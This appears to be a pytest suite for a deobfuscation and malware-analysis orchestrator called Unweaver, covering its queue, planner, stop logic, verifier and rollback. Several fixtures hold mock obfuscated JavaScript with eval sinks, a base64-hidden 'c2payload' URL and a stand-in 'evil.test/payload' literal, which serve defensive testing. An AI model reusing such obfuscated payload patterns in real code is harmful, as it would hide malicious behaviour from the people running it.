"""
Tests for the Unweaver orchestrator components: ActionQueue, StateManager,
and the iterative analysis loop logic.

These tests verify that:
  - The orchestration loop runs and terminates under various conditions.
  - Stop conditions (max iterations, stall) are enforced.
  - Action selection avoids repeated failures.
  - The verifier detects improvement via confidence/readability tracking.
"""

from __future__ import annotations

import base64
import marshal
import shutil

import pytest

from tests.dotnet_test_utils import (
    build_resx,
    build_test_dotnet_assembly,
    build_test_dotnet_assembly_with_resources,
)
from app.models.schemas import AnalysisState, TransformRecord
from app.services.analysis.action_queue import (
    ActionQueue,
    ActionStatus,
    QueuedAction,
)
from app.services.analysis.orchestrator import (
    Orchestrator,
    Planner,
    StopAction,
    StopDecision,
    Verifier,
)
from app.services.analysis.state_manager import StateManager
from app.services.transforms.base import TransformResult


# ════════════════════════════════════════════════════════════════════════
#  ActionQueue -- basic operations
# ════════════════════════════════════════════════════════════════════════

class TestActionQueue:
    """Tests for the ActionQueue priority queue."""

    def test_enqueue_and_dequeue(self):
        """Enqueue an action and dequeue it."""
        q = ActionQueue()
        assert q.enqueue("decode_base64", confidence=0.9) is True
        assert q.pending_count == 1
        action = q.dequeue()
        assert action is not None
        assert action.action_name == "decode_base64"
        assert action.status == ActionStatus.RUNNING

    def test_empty_queue_returns_none(self):
        """Dequeue from an empty queue returns None."""
        q = ActionQueue()
        assert q.dequeue() is None
        assert q.is_empty is True

    def test_priority_ordering(self):
        """Higher-confidence actions should be dequeued first."""
        q = ActionQueue()
        q.enqueue("low_priority", confidence=0.3)
        q.enqueue("high_priority", confidence=0.95)
        action = q.dequeue()
        assert action is not None
        # High confidence should come first (lower priority number)
        assert action.action_name == "high_priority"

    def test_deterministic_bonus(self):
        """Deterministic actions get priority boost."""
        q = ActionQueue()
        q.enqueue("decode_base64", confidence=0.5)  # deterministic
        q.enqueue("llm_rename_variables", confidence=0.5)  # not deterministic
        action = q.dequeue()
        assert action is not None
        assert action.action_name == "decode_base64"

    def test_duplicate_pending_rejected(self):
        """Cannot enqueue the same action twice while pending."""
        q = ActionQueue()
        assert q.enqueue("decode_base64", confidence=0.9) is True
        assert q.enqueue("decode_base64", confidence=0.9) is False
        assert q.pending_count == 1

    def test_mark_succeeded(self):
        """Marking an action as succeeded should update ledger."""
        q = ActionQueue()
        q.enqueue("decode_base64", confidence=0.9)
        q.dequeue()
        q.mark_succeeded("decode_base64")
        assert q.success_count("decode_base64") == 1
        assert q.failure_count("decode_base64") == 0

    def test_mark_failed(self):
        """Marking an action as failed should update ledger."""
        q = ActionQueue()
        q.enqueue("decode_base64", confidence=0.9)
        q.dequeue()
        q.mark_failed("decode_base64")
        assert q.failure_count("decode_base64") == 1

    def test_failure_cap_prevents_reenqueue(self):
        """After max_attempts failures, the action cannot be enqueued again."""
        q = ActionQueue()

        # First attempt
        q.enqueue("flaky_action", confidence=0.5, max_attempts=2)
        q.dequeue()
        q.mark_failed("flaky_action")

        # Second attempt
        q.enqueue("flaky_action", confidence=0.5, max_attempts=2)
        q.dequeue()
        q.mark_failed("flaky_action")

        # Third attempt should be rejected
        assert q.enqueue("flaky_action", confidence=0.5, max_attempts=2) is False

    def test_success_resets_failure_streak(self):
        """A later success should clear the retry cap for subsequent passes."""
        q = ActionQueue()

        q.enqueue("retryable_action", confidence=0.5, max_attempts=2)
        q.dequeue()
        q.mark_failed("retryable_action")

        q.enqueue("retryable_action", confidence=0.5, max_attempts=2)
        q.dequeue()
        q.mark_succeeded("retryable_action")

        assert q.failure_streak("retryable_action") == 0
        assert q.enqueue("retryable_action", confidence=0.5, max_attempts=2) is True

    def test_global_attempt_cap(self):
        """After _max_global_attempts total attempts, action is blocked."""
        q = ActionQueue()
        q._max_global_attempts = 3

        for i in range(3):
            q.enqueue(f"action_{i}", confidence=0.5)  # different names, fine
        # Same name, 3 attempts:
        q.enqueue("repeat_action", confidence=0.9)
        q.dequeue()
        q.mark_succeeded("repeat_action")
        q.enqueue("repeat_action", confidence=0.9)
        q.dequeue()
        q.mark_succeeded("repeat_action")
        q.enqueue("repeat_action", confidence=0.9)
        q.dequeue()
        q.mark_succeeded("repeat_action")
        # 4th should be rejected
        assert q.enqueue("repeat_action", confidence=0.9) is False

    def test_auto_approve_threshold(self):
        """High-confidence deterministic actions are auto-approved."""
        q = ActionQueue(auto_approve_threshold=0.85)
        q.enqueue("decode_base64", confidence=0.9)
        action = q.dequeue()
        assert action is not None
        assert action.auto_approve is True

    def test_non_deterministic_not_auto_approved(self):
        """Non-deterministic actions should NOT be auto-approved."""
        q = ActionQueue(auto_approve_threshold=0.85)
        q.enqueue("llm_rename", confidence=0.95)
        action = q.dequeue()
        assert action is not None
        assert action.auto_approve is False

    def test_peek_does_not_remove(self):
        """Peek should show next action without removing it."""
        q = ActionQueue()
        q.enqueue("decode_base64", confidence=0.9)
        peeked = q.peek()
        assert peeked is not None
        assert q.pending_count == 1  # still there

    def test_enqueue_many(self):
        """Bulk enqueue should add multiple actions."""
        q = ActionQueue()
        actions = [
            {"action_name": "decode_base64", "confidence": 0.9},
            {"action_name": "extract_strings", "confidence": 0.85},
            {"action_name": "decode_hex", "confidence": 0.8},
        ]
        added = q.enqueue_many(actions)
        assert added == 3
        assert q.pending_count == 3

    def test_clear_pending(self):
        """Clear pending should remove all pending actions."""
        q = ActionQueue()
        q.enqueue("a", confidence=0.5)
        q.enqueue("b", confidence=0.6)
        removed = q.clear_pending()
        assert removed == 2
        assert q.is_empty is True

    def test_snapshot(self):
        """Snapshot should serialise queue state."""
        q = ActionQueue()
        q.enqueue("decode_base64", confidence=0.9)
        snap = q.snapshot()
        assert len(snap) == 1
        assert snap[0]["action_name"] == "decode_base64"
        assert snap[0]["status"] == "pending"

    def test_has_been_tried(self):
        """has_been_tried should detect previously attempted actions."""
        q = ActionQueue()
        assert q.has_been_tried("decode_base64") is False
        q.enqueue("decode_base64", confidence=0.9)
        q.dequeue()
        q.mark_succeeded("decode_base64")
        assert q.has_been_tried("decode_base64") is True

    def test_mark_skipped(self):
        """Skipped actions should be tracked in ledger."""
        q = ActionQueue()
        q.enqueue("optional_action", confidence=0.4)
        q.dequeue()
        q.mark_skipped("optional_action")
        history = q.history("optional_action")
        assert ActionStatus.SKIPPED in history


# ════════════════════════════════════════════════════════════════════════
#  StateManager -- core operations
# ════════════════════════════════════════════════════════════════════════

class TestStateManager:
    """Tests for the StateManager orchestration state tracker."""

    def test_initial_state(self):
        """State manager should initialise with correct defaults."""
        sm = StateManager(
            sample_id="test-123",
            original_code="var x = 1;",
            language="javascript",
        )
        assert sm.sample_id == "test-123"
        assert sm.current_iteration == 0
        assert sm.overall_confidence == 0.0
        assert sm.stall_counter == 0
        assert sm.is_stopped is False
        assert sm.snapshot_count == 1  # initial snapshot

    def test_advance_iteration(self):
        """Advancing should increment the iteration counter."""
        sm = StateManager("test", "code")
        assert sm.advance_iteration() == 1
        assert sm.advance_iteration() == 2
        assert sm.current_iteration == 2

    def test_update_confidence(self):
        """Confidence updates should clamp to [0, 1]."""
        sm = StateManager("test", "code")
        sm.update_confidence(overall=0.75)
        assert sm.overall_confidence == 0.75

        sm.update_confidence(overall=1.5)
        assert sm.overall_confidence == 1.0

        sm.update_confidence(overall=-0.5)
        assert sm.overall_confidence == 0.0

    def test_stall_counter(self):
        """Stall counter should increment and reset correctly."""
        sm = StateManager("test", "code")
        assert sm.increment_stall() == 1
        assert sm.increment_stall() == 2
        sm.reset_stall()
        assert sm.stall_counter == 0

    def test_mark_stopped(self):
        """Marking stopped should set the flag."""
        sm = StateManager("test", "code")
        assert sm.is_stopped is False
        sm.mark_stopped()
        assert sm.is_stopped is True


# ════════════════════════════════════════════════════════════════════════
#  Stop Conditions
# ════════════════════════════════════════════════════════════════════════

class TestStopConditions:
    """Test that the analysis loop terminates under the right conditions."""

    def test_max_iterations_reached(self):
        """Loop should stop after MAX_ITERATIONS."""
        sm = StateManager("test", "code")
        max_iter = 20
        for i in range(max_iter):
            iteration = sm.advance_iteration()
            if iteration >= max_iter:
                break
        assert sm.current_iteration == max_iter

    def test_stall_threshold_reached(self):
        """Loop should stop when stall counter reaches threshold."""
        sm = StateManager("test", "code")
        stall_threshold = 3
        for _ in range(stall_threshold):
            sm.increment_stall()
        assert sm.stall_counter >= stall_threshold

    def test_confidence_threshold_reached(self):
        """Loop should stop when confidence exceeds threshold."""
        sm = StateManager("test", "code")
        threshold = 0.85
        sm.update_confidence(overall=0.90)
        assert sm.overall_confidence >= threshold

    def test_manual_stop(self):
        """Loop should stop when explicitly marked."""
        sm = StateManager("test", "code")
        sm.mark_stopped()
        assert sm.is_stopped is True

    def test_stall_resets_on_progress(self):
        """Stall counter should reset when confidence improves."""
        sm = StateManager("test", "code")
        sm.increment_stall()
        sm.increment_stall()
        assert sm.stall_counter == 2
        # Simulate progress: reset stall
        sm.reset_stall()
        sm.update_confidence(overall=0.5)
        assert sm.stall_counter == 0


# ════════════════════════════════════════════════════════════════════════
#  Action Selection -- avoiding repeated failures
# ════════════════════════════════════════════════════════════════════════

class TestActionSelection:
    """Test that the queue avoids scheduling actions that keep failing."""

    def test_failed_action_blocked_after_max_attempts(self):
        q = ActionQueue()

        # Attempt 1: fail
        q.enqueue("bad_transform", confidence=0.5, max_attempts=2)
        action = q.dequeue()
        q.mark_failed("bad_transform")

        # Attempt 2: fail
        q.enqueue("bad_transform", confidence=0.5, max_attempts=2)
        action = q.dequeue()
        q.mark_failed("bad_transform")

        # Attempt 3: should be rejected
        enqueued = q.enqueue("bad_transform", confidence=0.5, max_attempts=2)
        assert enqueued is False

    def test_succeeded_action_still_enqueueable(self):
        """A previously successful action can be re-enqueued."""
        q = ActionQueue()
        q.enqueue("decode_base64", confidence=0.9)
        q.dequeue()
        q.mark_succeeded("decode_base64")

        # Should be able to enqueue again
        assert q.enqueue("decode_base64", confidence=0.9) is True

    def test_mixed_success_failure_tracking(self):
        """Track mixed results in the ledger."""
        q = ActionQueue()

        # Success
        q.enqueue("transform_a", confidence=0.8)
        q.dequeue()
        q.mark_succeeded("transform_a")

        # Failure
        q.enqueue("transform_a", confidence=0.8)
        q.dequeue()
        q.mark_failed("transform_a")

        assert q.success_count("transform_a") == 1
        assert q.failure_count("transform_a") == 1
        assert q.total_attempts("transform_a") == 2


class TestPlannerWorkspaceBundles:
    def test_skips_detect_language_for_workspace_bundles(self):
        code = (
            "UNWEAVER_WORKSPACE_BUNDLE v1\n"
            "archive_name: repo.zip\n"
            "included_files: 2\n"
            "omitted_files: 0\n"
            "languages: typescript=2\n"
            "entry_points: apps/web/src/main.tsx\n"
            "suspicious_files: packages/api/src/decode.ts\n"
            "manifest_files: package.json\n"
            "root_dirs: apps | packages\n"
            "bundle_note: preserve markers.\n\n"
            '<<<FILE path="apps/web/src/main.tsx" language="typescript" priority="entrypoint" size=42>>>\n'
            "const payload = atob('aGVsbG8=');\n"
            "<<<END FILE>>>\n"
        )
        sm = StateManager("bundle-test", code, language="workspace")
        q = ActionQueue()
        planner = Planner(
            available_actions={
                "profile_workspace",
                "detect_language",
                "fingerprint_obfuscation",
                "extract_strings",
                "analyze_entropy",
                "llm_deobfuscate",
            }
        )

        actions = planner.plan(sm, q)
        names = [item.action_name for item in actions]

        assert "profile_workspace" in names
        assert "detect_language" not in names
        assert "fingerprint_obfuscation" in names

    def test_schedules_targeted_workspace_deobfuscation_after_profile(self):
        code = (
            "UNWEAVER_WORKSPACE_BUNDLE v1\n"
            "archive_name: repo.zip\n"
            "included_files: 2\n"
            "omitted_files: 0\n"
            "languages: javascript=2\n"
            "entry_points: src/main.js\n"
            "suspicious_files: src/decode.js\n"
            "manifest_files: package.json\n"
            "root_dirs: src\n"
            "bundle_note: preserve markers.\n\n"
            '<<<FILE path="src/main.js" language="javascript" priority="entrypoint" size=42>>>\n'
            "const payload = atob('aGVsbG8=');\n"
            "<<<END FILE>>>\n\n"
            '<<<FILE path="src/decode.js" language="javascript" priority="suspicious" size=60>>>\n'
            "const msg = String.fromCharCode(72, 105);\n"
            "<<<END FILE>>>\n"
        )
        sm = StateManager("bundle-targeted", code, language="workspace")
        sm.advance_iteration()
        sm.advance_iteration()
        sm.merge_workspace_context(
            {
                "entry_points": ["src/main.js"],
                "suspicious_files": ["src/decode.js"],
                "prioritized_files": [
                    {"path": "src/decode.js", "score": 9.5},
                    {"path": "src/main.js", "score": 8.0},
                ],
            }
        )
        q = ActionQueue()
        planner = Planner(
            available_actions={
                "profile_workspace",
                "fingerprint_obfuscation",
                "deobfuscate_workspace_files",
            }
        )

        actions = planner.plan(sm, q)
        names = [item.action_name for item in actions]

        assert "deobfuscate_workspace_files" in names

    def test_schedules_follow_up_workspace_wave_when_frontier_remains(self):
        code = (
            "UNWEAVER_WORKSPACE_BUNDLE v1\n"
            "archive_name: repo.zip\n"
            "included_files: 2\n"
            "omitted_files: 3\n"
            "languages: javascript=2\n"
            "entry_points: src/main.js\n"
            "suspicious_files: src/decode.js\n"
            "manifest_files: package.json\n"
            "root_dirs: src\n"
            "bundle_note: preserve markers.\n\n"
            '<<<FILE path="src/main.js" language="javascript" priority="entrypoint" size=42>>>\n'
            "const payload = atob('aGVsbG8=');\n"
            "<<<END FILE>>>\n\n"
            '<<<FILE path="src/decode.js" language="javascript" priority="suspicious" size=60>>>\n'
            "const msg = String.fromCharCode(72, 105);\n"
            "<<<END FILE>>>\n"
        )
        sm = StateManager("bundle-follow-up", code, language="workspace")
        sm.advance_iteration()
        sm.advance_iteration()
        sm.merge_workspace_context(
            {
                "entry_points": ["src/main.js"],
                "suspicious_files": ["src/decode.js"],
                "prioritized_files": [
                    {"path": "src/decode.js", "score": 9.5},
                    {"path": "src/main.js", "score": 8.0},
                ],
                "remaining_frontier_paths": ["src/extra.js"],
            }
        )
        q = ActionQueue()
        q.enqueue("deobfuscate_workspace_files", confidence=0.8)
        q.dequeue()
        q.mark_succeeded("deobfuscate_workspace_files")
        planner = Planner(
            available_actions={
                "profile_workspace",
                "fingerprint_obfuscation",
                "deobfuscate_workspace_files",
            }
        )

        actions = planner.plan(sm, q)
        names = [item.action_name for item in actions]

        assert "deobfuscate_workspace_files" in names


class TestPlannerPreprocessing:
    def test_schedules_preprocess_for_minified_code(self):
        code = (
            "function run(){const alpha=1;const beta=2;const gamma=3;const delta=4;"
            "return alpha+beta+gamma+delta;}function beacon(){const url='https://a.test';"
            "return fetch(url).then(r=>r.text());}"
        )
        sm = StateManager("minified", code, language="javascript")
        q = ActionQueue()
        planner = Planner(
            available_actions={
                "preprocess_source",
                "detect_language",
                "fingerprint_obfuscation",
            }
        )

        actions = planner.plan(sm, q)
        names = [item.action_name for item in actions]

        assert "preprocess_source" in names

    def test_schedules_specialist_bundle_pass_for_bundle_runtime(self):
        code = (
            "(()=>{var __webpack_modules__={1:(module)=>{module.exports='ok'}};"
            "function __webpack_require__(id){return __webpack_modules__[id];}"
            "console.log(__webpack_require__(1));})();"
        )
        sm = StateManager("bundle-pass", code, language="javascript")
        sm.advance_iteration()
        sm.advance_iteration()
        q = ActionQueue()
        planner = Planner(
            available_actions={
                "deobfuscate_js_bundle",
                "fingerprint_obfuscation",
            }
        )

        actions = planner.plan(sm, q)
        names = [item.action_name for item in actions]

        assert "deobfuscate_js_bundle" in names


class TestPlannerLLMGating:
    def test_defers_llm_deobfuscation_while_targeted_decoder_is_pending(self):
        sm = StateManager(
            "llm-gating-early",
            "const payload = atob('aGVsbG8=');",
            language="javascript",
        )
        sm.advance_iteration()
        sm.advance_iteration()
        q = ActionQueue()
        planner = Planner(
            available_actions={
                "decode_base64",
                "llm_deobfuscate",
            }
        )

        actions = planner.plan(sm, q)
        names = [item.action_name for item in actions]

        assert "decode_base64" in names
        assert "llm_deobfuscate" not in names

    def test_schedules_early_llm_for_hard_javascript(self):
        sm = StateManager(
            "llm-gating-hard-js",
            (
                "var _0x1a2b=['YWxlcnQoMSk=','log'];"
                "var _0x5c6d=function(_0x7f0a){return _0x1a2b[_0x7f0a];};"
                "function _0x9e1b(){debugger;return _0x5c6d('0x0');}"
                "while(!![]){switch(_0x5c6d('0x1')){case 'log':console[_0x5c6d('0x1')](_0x9e1b());break;}}"
            ),
            language="javascript",
        )
        sm.advance_iteration()
        sm.advance_iteration()
        q = ActionQueue()
        q.enqueue("identify_string_resolver", confidence=0.9)
        q.dequeue()
        q.mark_succeeded("identify_string_resolver")
        planner = Planner(
            available_actions={
                "identify_string_resolver",
                "unflatten_control_flow",
                "llm_deobfuscate",
                "llm_multilayer_unwrap",
            }
        )

        actions = planner.plan(sm, q)
        names = [item.action_name for item in actions]
        hard_mode = sm.state.iteration_state.get("js_hard_mode", {})

        assert hard_mode.get("enabled") is True
        assert "llm_deobfuscate" in names
        assert "llm_multilayer_unwrap" in names
        assert "string_array_wrappers" in hard_mode.get("signals", [])

    def test_schedules_llm_after_minified_beautification_when_js_evidence_remains(self):
        sm = StateManager(
            "llm-gating-post-beautify",
            "function run(){const payload='hello';return eval(payload);}",
            language="javascript",
        )
        sm.advance_iteration()
        sm.advance_iteration()
        sm.state.detected_techniques.append("minified_code_beautification")
        sm.add_suspicious_apis(["eval", "Function"])
        sm.add_recovered_literals(["hello"])
        sm.add_functions(["run"])
        q = ActionQueue()
        q.enqueue("preprocess_source", confidence=0.9)
        q.dequeue()
        q.mark_succeeded("preprocess_source")
        planner = Planner(
            available_actions={
                "preprocess_source",
                "llm_deobfuscate",
            }
        )

        actions = planner.plan(sm, q)
        names = [item.action_name for item in actions]

        assert "llm_deobfuscate" in names

    def test_schedules_llm_deobfuscation_after_stall_with_evidence(self):
        sm = StateManager(
            "llm-gating-stall",
            "var data = payload();",
            language="javascript",
        )
        for _ in range(4):
            sm.advance_iteration()
        sm.increment_stall()
        sm.increment_stall()
        sm.add_suspicious_apis(["eval", "Function"])
        sm.add_recovered_literals(["http://evil.test/payload"])
        sm.add_imports(["child_process"])
        q = ActionQueue()
        planner = Planner(
            available_actions={
                "llm_deobfuscate",
            }
        )

        actions = planner.plan(sm, q)
        names = [item.action_name for item in actions]

        assert "llm_deobfuscate" in names

    def test_schedules_llm_deobfuscation_when_residual_wrappers_remain(self):
        sm = StateManager(
            "llm-gating-residual",
            (
                "var _0x4a2b=['aHR0cDovL2V4YW1wbGUuY29tL3BheWxvYWQ='];\n"
                "var _0xf1=function(_0x1){return _0x4a2b[_0x1];};\n"
                "const url = atob(_0xf1('0x0'));\n"
                "eval('console' + '.' + 'log' + '(' + 'url' + ')');\n"
            ),
            language="javascript",
        )
        sm.advance_iteration()
        sm.advance_iteration()
        q = ActionQueue()
        q.enqueue("identify_string_resolver", confidence=0.9)
        q.dequeue()
        q.mark_succeeded("identify_string_resolver")
        planner = Planner(
            available_actions={
                "identify_string_resolver",
                "constant_fold",
                "llm_deobfuscate",
            }
        )

        actions = planner.plan(sm, q)
        names = [item.action_name for item in actions]

        assert "llm_deobfuscate" in names

    def test_reruns_eval_detection_after_literal_payload_is_exposed(self):
        sm = StateManager(
            "literal-eval-rerun",
            """eval('console.log("loaded")');""",
            language="javascript",
        )
        sm.add_detected_techniques(["eval_exec"])
        q = ActionQueue()
        q.enqueue("detect_eval_exec_reflection", confidence=0.9)
        q.dequeue()
        q.mark_succeeded("detect_eval_exec_reflection")
        q.enqueue("constant_fold", confidence=0.9)
        q.dequeue()
        q.mark_succeeded("constant_fold")
        planner = Planner(
            available_actions={
                "detect_eval_exec_reflection",
                "constant_fold",
            }
        )

        actions = planner.plan(sm, q)
        names = [item.action_name for item in actions]

        assert "detect_eval_exec_reflection" in names

    def test_schedules_llm_rename_earlier_for_hard_javascript(self):
        sm = StateManager(
            "llm-rename-hard-js",
            (
                "var _0x1a2b=['one','two'];"
                "var _0x5c6d=function(_0x7f0a){return _0x1a2b[_0x7f0a];};"
                "function _0x9e1b(){debugger;return _0x5c6d('0x0');}"
                "eval(_0x9e1b());"
            ),
            language="javascript",
        )
        for _ in range(3):
            sm.advance_iteration()
        sm.add_suspicious_apis(["eval"])
        sm.add_recovered_literals(["one"])
        q = ActionQueue()
        q.enqueue("identify_string_resolver", confidence=0.9)
        q.dequeue()
        q.mark_succeeded("identify_string_resolver")
        planner = Planner(
            available_actions={
                "apply_renames",
                "llm_rename",
            }
        )

        actions = planner.plan(sm, q)
        names = [item.action_name for item in actions]

        assert "apply_renames" in names
        assert "llm_rename" in names


class TestStopDecisionResiduals:
    def test_does_not_stop_when_high_confidence_but_residual_markers_remain(self):
        sm = StateManager(
            "stop-residual",
            (
                "const decodedUrl = atob(resolveString('0x0'));\n"
                "function run() {\n"
                "    return decodedUrl;\n"
                "}\n"
            ),
            language="javascript",
        )
        sm.advance_iteration()
        sm.update_confidence(overall=0.9)
        q = ActionQueue()
        q.enqueue("llm_deobfuscate", confidence=0.6)
        decision = StopDecision(sufficiency_threshold=0.85)

        verdict = decision.evaluate(
            sm,
            q,
            last_transform_success=True,
            improvement_score=0.1,
        )

        assert verdict.action == StopAction.CONTINUE
        assert "residual" in verdict.reason.lower() or "wrapper" in verdict.reason.lower()

    def test_allows_replanning_when_queue_is_empty_but_residual_wrappers_remain(self):
        sm = StateManager(
            "stop-replan-residual",
            """eval('console.log("loaded")');""",
            language="javascript",
        )
        sm.advance_iteration()
        sm.update_confidence(overall=0.95)
        decision = StopDecision(sufficiency_threshold=0.85)
        q = ActionQueue()

        verdict = decision.evaluate(
            sm,
            q,
            last_transform_success=True,
            improvement_score=0.02,
        )

        assert verdict.action == StopAction.CONTINUE
        assert "planning" in verdict.reason.lower() or "queue exhausted" in verdict.reason.lower()


class TestOrchestratorStopRequests:
    @pytest.mark.asyncio
    async def test_run_respects_stop_request_before_first_iteration(self):
        orchestrator = Orchestrator(
            sample_id="stop-test",
            original_code="var payload = atob('aGVsbG8=');",
            language="javascript",
        )

        result = await orchestrator.run(
            max_iterations=3,
            stop_requested=lambda: True,
        )

        assert result.was_stopped is True
        assert result.iterations == 0
        assert "Stop requested by user" in result.stop_reason
        assert result.state.iteration_state["stopped"] is True

    @pytest.mark.asyncio
    async def test_run_bootstraps_preprocessing_before_iterations(self):
        code = (
            "function run(){const alpha=1;const beta=2;const gamma=3;const delta=4;"
            "return alpha+beta+gamma+delta;}function beacon(){const url='https://a.test';"
            "return fetch(url).then(r=>r.text());}"
        )
        orchestrator = Orchestrator(
            sample_id="preprocess-test",
            original_code=code,
            language="javascript",
        )

        result = await orchestrator.run(max_iterations=1)

        assert any(
            item.action == "preprocess_source"
            for item in result.state.transform_history
        )
        assert "\n" in result.deobfuscated_code

    @pytest.mark.asyncio
    async def test_run_marks_unhandled_errors_as_failures(self, monkeypatch: pytest.MonkeyPatch):
        def _explode(self):
            raise RuntimeError("boom")

        monkeypatch.setattr(StateManager, "advance_iteration", _explode)

        orchestrator = Orchestrator(
            sample_id="fatal-error-test",
            original_code="var payload = atob('aGVsbG8=');",
            language="javascript",
        )

        result = await orchestrator.run(max_iterations=2)

        assert result.success is False
        assert result.stop_reason == "Unhandled error during orchestration."
        assert result.fatal_error == "RuntimeError: boom"
        assert result.state.parse_status == "failed"
        assert result.state.iteration_state["fatal_error"] == "RuntimeError: boom"
        assert result.was_stopped is False



# ════════════════════════════════════════════════════════════════════════
#  Verifier -- detecting improvement
# ════════════════════════════════════════════════════════════════════════

class TestVerifierDetectsImprovement:
    """Test that the StateManager tracks confidence and readability trends."""

    def test_confidence_improves_over_iterations(self):
        """Confidence history should reflect updates."""
        sm = StateManager("test", "var _0x1 = 1;")
        sm.update_confidence(overall=0.2)
        sm.update_confidence(overall=0.5)
        sm.update_confidence(overall=0.8)
        history = sm.confidence_history
        assert history == [0.0, 0.2, 0.5, 0.8]
        assert history[-1] > history[0]

    def test_readability_improves_with_better_code(self):
        """Readability should increase when code becomes more readable."""
        obfuscated = "var _0x1=_0x2(_0x3[0x0]);_0x4(_0x1);"
        sm = StateManager("test", obfuscated)
        initial_readability = sm.readability_history[-1]

        readable = """
// Fetch user data from the remote server
function fetchUserData(userId) {
    var endpoint = "https://api.example.com/users/" + userId;
    return fetch(endpoint);
}
"""
        new_score = sm.update_readability(readable)
        assert new_score > initial_readability

    def test_readability_history_tracked(self):
        """Readability history should grow with each update."""
        sm = StateManager("test", "var x = 1;")
        sm.update_readability("function hello() { return 'hi'; }")
        sm.update_readability("// comment\nfunction hello() { return 'hi'; }")
        assert len(sm.readability_history) == 3  # initial + 2 updates

    def test_workspace_file_level_improvement_is_detected(self):
        before = (
            "UNWEAVER_WORKSPACE_BUNDLE v1\n"
            "archive_name: repo.zip\n"
            "included_files: 2\n"
            "omitted_files: 0\n"
            "languages: javascript=2\n"
            "entry_points: src/main.js\n"
            "suspicious_files: src/main.js\n"
            "manifest_files: package.json\n"
            "root_dirs: src\n"
            "bundle_note: preserve markers.\n\n"
            '<<<FILE path="src/main.js" language="javascript" priority="suspicious,entrypoint" size=58>>>\n'
            "const msg = String.fromCharCode(72, 105);\n"
            "<<<END FILE>>>\n\n"
            '<<<FILE path="src/large.js" language="javascript" priority="normal" size=220>>>\n'
            "const filler = '"
            + ("A" * 180)
            + "';\n"
            "<<<END FILE>>>\n"
        )
        after = before.replace(
            "const msg = String.fromCharCode(72, 105);",
            'const msg = "Hi";',
        )
        verifier = Verifier()
        sm = StateManager("workspace-verify", before, language="workspace")
        result = TransformResult(
            success=True,
            output=after,
            confidence=0.8,
            description="Improved one workspace file.",
            details={"deobfuscated_files": ["src/main.js"]},
        )

        improvement = verifier.verify(before, after, result, sm)

        assert improvement > 0.05

    def test_identified_sinks_increase_improvement_score(self):
        code = "eval(payload);"
        verifier = Verifier()
        sm = StateManager("sink-verify", code, language="javascript")
        result = TransformResult(
            success=True,
            output=code,
            confidence=0.85,
            description="Identified an execution sink.",
            details={
                "identified_sinks": [
                    {
                        "api": "eval",
                        "family": "dynamic_code_execution",
                        "severity": "high",
                        "argument": "payload",
                    }
                ],
                "suspicious_apis": ["eval:high"],
            },
        )

        improvement = verifier.verify(code, code, result, sm)

        assert improvement > 0.05


# ════════════════════════════════════════════════════════════════════════
#  Snapshot and Rollback
# ════════════════════════════════════════════════════════════════════════

class TestSnapshotAndRollback:
    """Test state snapshot and rollback capabilities."""

    def test_snapshot_is_taken(self):
        sm = StateManager("test", "code")
        sm.advance_iteration()
        sm.update_confidence(overall=0.5)
        snap = sm.take_snapshot()
        assert snap.iteration == 1
        assert snap.state.confidence["overall"] == 0.5

    def test_rollback_to_previous(self):
        sm = StateManager("test", "original code")

        # Iteration 1
        sm.advance_iteration()
        sm.update_confidence(overall=0.5)
        sm.current_code = "modified code v1"
        sm.take_snapshot()

        # Iteration 2
        sm.advance_iteration()
        sm.update_confidence(overall=0.3)  # regression
        sm.current_code = "modified code v2 (worse)"
        sm.take_snapshot()

        # Rollback to iteration 1
        success = sm.rollback(to_iteration=1)
        assert success is True
        assert sm.overall_confidence == 0.5
        assert sm.current_code == "modified code v1"

    def test_rollback_without_snapshots_fails(self):
        """Cannot rollback with fewer than 2 snapshots."""
        sm = StateManager("test", "code")
        # Only have the initial snapshot
        result = sm.rollback()
        assert result is False

    def test_get_snapshot_by_iteration(self):
        sm = StateManager("test", "code")
        sm.advance_iteration()
        sm.take_snapshot()
        snap = sm.get_snapshot(1)
        assert snap is not None
        assert snap.iteration == 1

    def test_get_nonexistent_snapshot(self):
        sm = StateManager("test", "code")
        snap = sm.get_snapshot(999)
        assert snap is None

    def test_record_transform(self):
        """Recording a transform should update the state."""
        sm = StateManager("test", "original")
        record = TransformRecord(
            iteration=1,
            action="decode_base64",
            reason="base64 blob detected",
            confidence_before=0.0,
            confidence_after=0.5,
            success=True,
        )
        sm.record_transform(record, new_code="decoded code")
        assert sm.current_code == "decoded code"
        assert len(sm.state.transform_history) == 1

    def test_add_detected_techniques(self):
        sm = StateManager("test", "code")
        sm.add_detected_techniques(["base64_encoding", "string_concatenation"])
        sm.add_detected_techniques(["base64_encoding"])  # duplicate
        assert len(sm.state.detected_techniques) == 2

    def test_set_language(self):
        sm = StateManager("test", "code")
        sm.set_language("javascript")
        assert sm.state.language == "javascript"

    def test_to_dict(self):
        sm = StateManager("test-id", "var x = 1;", language="javascript")
        d = sm.to_dict()
        assert d["sample_id"] == "test-id"
        assert d["current_iteration"] == 0
        assert "state" in d


class TestOrchestratorDecoderCoverage:
    @pytest.mark.asyncio
    async def test_javascript_array_resolver_runs_in_orchestrator(self):
        code = (
            "var _0xabc=['a','b','c'];"
            "(function(_0xArr,_0xRot){while(--_0xRot)_0xArr.push(_0xArr.shift());})"
            "(_0xabc,0x1);"
            "console.log(_0xabc[0]);"
        )
        result = await Orchestrator(
            sample_id="js-array-resolver",
            original_code=code,
            language="javascript",
        ).run(max_iterations=10)

        actions = [item.action for item in result.transform_history]
        assert "identify_string_resolver" in actions
        assert 'console.log("b");' in result.deobfuscated_code

    @pytest.mark.asyncio
    async def test_javascript_demo_sample_fully_recovers_code(self):
        code = (
            "var _0x4a2b = ['aHR0cDovL2V4YW1wbGUuY29tL2MycGF5bG9hZA==', "
            "'bG9jYWxTdG9yYWdl', 'Z2V0SXRlbQ=='];\n"
            "(function(_0x1a2b3c, _0x4a2b5d) {\n"
            "    var _0x1f3a = function(_0x2d1e4f) {\n"
            "        while (--_0x2d1e4f) {\n"
            "            _0x1a2b3c['push'](_0x1a2b3c['shift']());\n"
            "        }\n"
            "    };\n"
            "    _0x1f3a(++_0x4a2b5d);\n"
            "}(_0x4a2b, 0x1a3));\n"
            "var _0xf1 = function(_0x1, _0x2) {\n"
            "    _0x1 = _0x1 - 0x0;\n"
            "    var _0x3 = _0x4a2b[_0x1];\n"
            "    return _0x3;\n"
            "};\n"
            "var url = atob(_0xf1('0x0'));\n"
            "var storage = _0xf1('0x1');\n"
            "eval('console' + '.' + 'log' + '(' + '\"loaded\"' + ')');\n"
        )
        result = await Orchestrator(
